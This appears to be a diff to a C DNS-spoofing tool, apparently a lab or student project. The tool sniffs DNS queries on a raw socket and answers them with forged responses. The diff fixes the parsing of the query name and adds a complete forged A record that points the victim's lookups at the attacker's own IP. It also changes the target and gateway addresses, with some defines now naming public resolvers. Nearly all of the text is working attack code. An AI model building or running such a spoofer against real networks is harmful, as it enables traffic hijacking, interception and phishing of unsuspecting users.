@@ -27,13 +27,13 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-#define INTERFACE_NAME "enp0s31f6"
-//#define INTERFACE_NAME "wlp2s0"
+//#define INTERFACE_NAME "enp0s31f6"
+#define INTERFACE_NAME "wlp2s0"
 
-#define GATEWAY_IP "192.168.0.1"
-#define TARGET_IP "192.168.0.6"
-//#define GATEWAY_IP "1.1.1.1"
-//#define TARGET_IP "8.8.8.8"
+//#define GATEWAY_IP "192.168.0.1"
+//#define TARGET_IP "192.168.0.6"
+#define GATEWAY_IP "1.1.1.1"
+#define TARGET_IP "8.8.8.8"
 //#define GATEWAY_IP "142.232.49.6"
 //#define TARGET_IP "142.232.48.123"
 
@@ -371,8 +371,7 @@ void spoof_dns(int sock) {
         ih->saddr = recv_ih->daddr;
         ih->daddr = recv_ih->saddr;
         ih->tot_len = htons(20 + sizeof(struct udphdr) + data_len);
-        //ih->id = htons(ntohs(recv_ih->id) + 1);
-        ih->id = recv_ih->id;
+        ih->id = htons(ntohs(recv_ih->id) + 1);
         ih->ttl = recv_ih->ttl;
         ih->tos = 0;
         ih->frag_off = 0;
@@ -392,8 +391,8 @@ void spoof_dns(int sock) {
         //DNS stuffs
         //Transaction ID
         memcpy(data, recv_data, 2);
-        //Set response flags to 0x8180
-        data[2] = 0x81;
+        //Set response flags to 0x8580
+        data[2] = 0x85;
         data[3] = 0x80;
 
         //Copy number of questions
@@ -406,21 +405,61 @@ void spoof_dns(int sock) {
         //Zero authority or additional RR
         memset(data + 8, 0, 4);
 
+        printf("Initial name length: %d\n", recv_data[12]);
+
         //Time to parse question string
         int name_len = 0;
+        int section_count = 0;
         for (;;) {
-            if (recv_data[11 + name_len] == 0x00) {
+            if (recv_data[12 + name_len + section_count] == 0x00) {
                 break;
             }
-            name_len += recv_data[9 + name_len];
+            //if (name_len == 0) {
+                //printf("Updating section with: %d\n", recv_data[12]);
+                //name_len = recv_data[12 + name_len + section_count];
+            //} else {
+                printf("Updating section with: %d\n", recv_data[12 + name_len + section_count]);
+                name_len += recv_data[12 + name_len + section_count++];
+            //}
+        printf("Loop Name len: %d\n", name_len);
         }
-        memcpy(data + 11, recv_data + 11, name_len);
+        //name_len += section_count - 1;
+        name_len += section_count;
+        memcpy(data + 12, recv_data + 12, name_len);
+
+        printf("Name len: %d\n", name_len);
+
+        //NULL terminate name
+        data[12 + name_len + 0] = 0x00;
 
         //A record, IN address
-        data[11 + name_len + 0] = 0x00;
-        data[11 + name_len + 1] = 0x01;
-        data[11 + name_len + 2] = 0x00;
-        data[11 + name_len + 3] = 0x01;
+        data[12 + name_len + 1] = 0x00;
+        data[12 + name_len + 2] = 0x01;
+        data[12 + name_len + 3] = 0x00;
+        data[12 + name_len + 4] = 0x01;
+
+        //Compress name via pointer to question name string
+        data[12 + name_len + 5] = 0xc0;
+        //12 bytes offset
+        data[12 + name_len + 6] = 0x0c;
+
+        //Type A, IN address
+        data[12 + name_len + 7] = 0x00;
+        data[12 + name_len + 8] = 0x01;
+        data[12 + name_len + 9] = 0x00;
+        data[12 + name_len + 10] = 0x01;
+
+        //TTL = 7200
+        data[12 + name_len + 11] = 0x00;
+        data[12 + name_len + 12] = 0x00;
+        data[12 + name_len + 13] = 0x1c;
+        data[12 + name_len + 14] = 0x20;
+
+        //Data length = 4
+        data[12 + name_len + 15] = 0x00;
+        data[12 + name_len + 16] = 0x04;
+
+        memcpy(data + 12 + name_len + 17, &local_ip, 4);
 
         struct sockaddr_ll addr = {0};
         addr.sll_family = AF_PACKET;
@@ -431,7 +470,7 @@ void spoof_dns(int sock) {
 
         sendto(sock, buffer,
                 sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)
-                        + data_len,
+                        + data_len + 40,
                 0, (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
         printf("Spoofed dns response\n");
     }
